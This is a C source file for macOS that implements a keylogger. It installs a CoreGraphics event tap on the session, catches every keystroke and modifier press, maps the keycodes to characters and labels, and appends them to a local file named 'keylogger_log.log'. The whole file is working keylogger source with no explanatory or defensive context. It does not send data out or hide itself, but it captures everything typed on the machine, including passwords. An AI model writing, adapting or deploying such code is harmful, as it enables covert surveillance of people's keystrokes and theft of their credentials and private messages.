// HEADERS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>

FILE * log_file;

// FUNCTIONS
void setupLogFile();
void startListen();
CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void * userinfo);

char * mapKeyCodes(int code);

int main(int argc, char * argv[]) {
	setupLogFile();
	startListen();
	return 0;
}

void setupLogFile() {
	log_file = fopen("keylogger_log.log", "a");
	if(log_file == NULL) {
		perror("Unable to create log file");
		exit(1);
	}
}

void startListen() {
	CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
	CFMachPortRef event = CGEventTapCreate(
		kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault, mask, callback, NULL
	);

	if(event == NULL) {
		perror("Unable to create event tap");
		exit(1);
	}

	CFRunLoopSourceRef loopRef = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event, 0);
	CFRunLoopAddSource(CFRunLoopGetCurrent(), loopRef, kCFRunLoopDefaultMode);
	CFRunLoopRun();
}


CGEventRef callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void * refcon) {
	if (type == kCGEventKeyDown) {
		int code = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
		fprintf(log_file, "%s", mapKeyCodes(code));
	}

	if (type == kCGEventFlagsChanged) {
		CGEventFlags flags = CGEventGetFlags(event);

		if ((flags & kCGEventFlagMaskShift) 	 ||
			(flags & kCGEventFlagMaskControl) 	 ||
			(flags & kCGEventFlagMaskAlternate)  ||
			(flags & kCGEventFlagMaskCommand)) {

			int keyCode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
			fprintf(log_file, "%s", mapKeyCodes(keyCode));
 	  }
	}

	fflush(log_file);
    return event;
}

char * mapKeyCodes(int code) {
	switch (code) {
	case 0:		return "a";
	case 1:		return "s";
	case 2:		return "d";
	case 3:		return "f";
	case 4:		return "h";
	case 5:		return "g";
	case 6:		return "z";
	case 7:		return "x";
	case 8:		return "c";
	case 9:		return "v";
	
	case 11:	return "b";
	case 12:	return "q";
	case 13:	return "w";
	case 14:	return "e";
	case 15:	return "r";
	case 16:	return "y";
	case 17:	return "t";
	case 18:	return "1";
	case 19:	return "2";
	case 20:	return "3";
	case 21:	return "4";
	case 22:	return "6";
	case 23:	return "5";
	case 24:	return "=";
	case 25:	return "9";
	case 26:	return "7";
	case 27:	return "-";
	case 28:	return "8";
	case 29:	return "0";
	case 30:	return "]";
	case 31:	return "o";
	case 32:	return "u";
	case 33:	return "[";
	case 34:	return "i";
	case 35:	return "p";
	case 36:	return "\n";
	case 37:	return "l";
	case 38:	return "j";
	case 39:	return "'";
	case 40:	return "k";
	case 41:	return ";";
	case 42:	return "\\";
	case 43:	return ",";
	case 44:	return "/";
	case 45:	return "n";
	case 46:	return "m";
	case 47:	return ".";
	case 48:	return "[TAB]";
	case 49:	return " ";
	case 50:	return "`";
	case 51:	return "[DELETE]";
	case 52:	return "\n";
	case 53:	return "[ESC]";

	case 54:
	case 55:	return "[COMMAND]";

	case 56:
	case 60:	return "[SHIFT]";

	case 58:
	case 61: 	return "[OPTION]";

	case 62: return "[CONTROL]";
	
	case 65:	return ".";
	
	case 67:	return "*";
	
	case 69:	return "+";
	
	case 71:	return "[CLEAR]";
	
	case 75:	return "/";
	case 76:	return "\n";
	
	case 78:	return "-";
	
	case 81:	return "=";
	case 82:	return "0";
	case 83:	return "1";
	case 84:	return "2";
	case 85:	return "3";
	case 86:	return "4";
	case 87:	return "5";
	case 88:	return "6";
	case 89:	return "7";
	
	case 91:	return "8";
	case 92:	return "9";
	
	case 96:	return "[F5]";
	case 97:	return "[F6]";
	case 98:	return "[F7]";
	case 99:	return "[F3]";
	case 100:	return "[F8]";
	case 101:	return "[F9]";
	
	case 103:	return "[F11]";
	
	case 105:	return "[F13]";
	
	case 107:	return "[F14]";
	
	case 109:	return "[F10]";
	
	case 111:	return "[F12]";
	
	case 113:	return "[F15]";
	case 114:	return "[HELP]";
	case 115:	return "[HOME]";
	case 116:	return "[PGUP]";
	case 117:	return "[DELETE]";
	case 118:	return "[F4]";
	case 119:	return "[END]";
	case 120:	return "[F2]";
	case 121:	return "[PGDN]";
	case 122:	return "[F1]";
	case 123:	return "[LEFTARROW]";
	case 124:	return "[RIGHTARROW]";
	case 125:	return "[DOWNARROW]";
	case 126:	return "[UPARROW]";
	
	default: 	return "[UNMAPPED]";
}
}